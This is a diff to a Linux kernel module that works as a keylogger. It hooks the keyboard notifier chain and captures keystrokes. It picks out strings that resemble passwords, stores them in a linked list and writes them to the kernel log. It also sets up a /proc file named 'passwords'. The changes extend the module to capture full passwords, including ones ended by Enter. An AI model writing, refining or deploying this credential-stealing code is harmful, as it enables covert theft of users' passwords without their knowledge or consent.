@@ -14,8 +14,13 @@
  * 	   a letter.
  *
  * */
-
 #include "helper.h"
+
+#define CLEAR_BUFFER(x, len) \
+	for(int i=0; i<len; i++) { \
+		x[i] = '\0'; \
+	} \
+
 
 #define PROC_FILE_NAME "passwords"
 
@@ -25,18 +30,22 @@ bool overwrite = false;
 struct password* HEAD = NULL;
 
 // We want a reference to the password* head
-// TODO create a remove / overwrite with kfree
 void push(struct password** head, char* password_value){ // Probably don't need to set this as a parameter, but whatever, I like it.
         // 'current' is a macro :/
 	struct password* curr;
 	struct password* new_node;
-	
+	int i;
 	password_count++; // TODO keep an eye on the location of this.
 	
 	if(!overwrite){
 		// Use kfree on this bad boy
 		new_node = (struct password*)kmalloc(sizeof(struct password), GFP_KERNEL);
-		new_node->pw[0] = password_value[0]; // TODO fix this assigment
+		
+		for(i=0; i<strlen(password_value); i++){
+			new_node->pw[i] = password_value[i];
+		}
+		
+		printk("Password: %s\n", new_node->pw);
 		new_node->overwrite_num = 1;
 	        new_node->next = NULL;
         
@@ -60,8 +69,11 @@ void push(struct password** head, char* password_value){ // Probably don't need 
 		// Iterate until we find the next node for overwriting
 		curr = *head;
 		if(password_count % 100 == 1){ // Should be at head again.
-			curr->pw[0] = password_value[0];
+			for(i=0; i<strlen(password_value); i++){
+				curr->pw[i] = password_value[i];
+			}
 			curr->overwrite_num++;
+			printk("Password: %s\n", curr->pw);
 			return;
 		}
 		while(curr->overwrite_num == curr->next->overwrite_num){
@@ -89,7 +101,9 @@ void ll_destructor(struct password** head){
                 kfree(curr);
                 if(next != NULL){
                         curr = next;
-                }
+                }else{
+			break;
+		}
         }
 	overwrite = false;
 }
@@ -97,7 +111,6 @@ void ll_destructor(struct password** head){
 void check_pw(char* pw, int len){
 	// uppercase, lowercase, number, symbol
 	char rules[4] = {0, 0, 0, 0};
-	int i;
 	char *c;
 	int reject = 0;
 	for(c=pw; *c ; c++){
@@ -118,7 +131,7 @@ void check_pw(char* pw, int len){
 	}
 	if(rules[0] += rules[1] += rules[2] += rules[3] > 2 && !reject){ // At least 3 are correct
 		push(&HEAD, pw);
-		printk("Password: %s\n", pw);
+		printk("PUSHING\n");
 	}
 }
 
@@ -130,27 +143,29 @@ ssize_t read_password(struct file *filp,char *buf,size_t count,loff_t *offp ) {
 struct proc_ops proc_fops = {
 	proc_read: read_password,
 };
-
-char pw_buffer[16];
+//doesn't like when it gets to the limit here
+char pw_buffer[1000];
 
 int kb_notifier_fn(struct notifier_block *pnb, unsigned long action, void* data){
 	int len;
 	struct keyboard_notifier_param *kp = (struct keyboard_notifier_param*)data;
 	//printk("Key:  %d  Lights:  %d  Shiftmax:  %x\n", kp->value, kp->ledstate, kp->shift);
 
+	
 	if(kp->value > 57 || kp->value == 54 || kp->value == 42 || kp->value == 14) return 0; // The shifts and back space
 
-	len = strlen(pw_buffer);
-	if(len == 15 || kp->value == 57){ // reset it on a space as well
-		check_pw(pw_buffer, len);
-		pw_buffer[0] = '\0';
-		if(kp->value == 57) return 0; // return if it is a space
+	if(kp->down){
+		len = strlen(pw_buffer);
+		printk("length of the buffer: %d\n", len);
+		if(len == 15 || kp->value == 57 || kp->value == 28){ // reset it on a space and newline as well
+			check_pw(pw_buffer, len);
+			CLEAR_BUFFER(pw_buffer, len);
+			if(kp->value == 57 || kp->value == 28) return 0; // return if it is a space
+		}
+		pw_buffer[len] = *keymap[kp->value][kp->shift];
 	}
-	
-	pw_buffer[len] = *keymap[kp->value][kp->shift];
-	
-	printk("Letter: %s\n", keymap[kp->value][kp->shift]);
-	printk("Number of passwords: %d\n", password_count);
+	//printk("Letter: %s\n", keymap[kp->value][kp->shift]);
+	//printk("Number of passwords: %d\n", password_count);
 
 	return 0;
 }
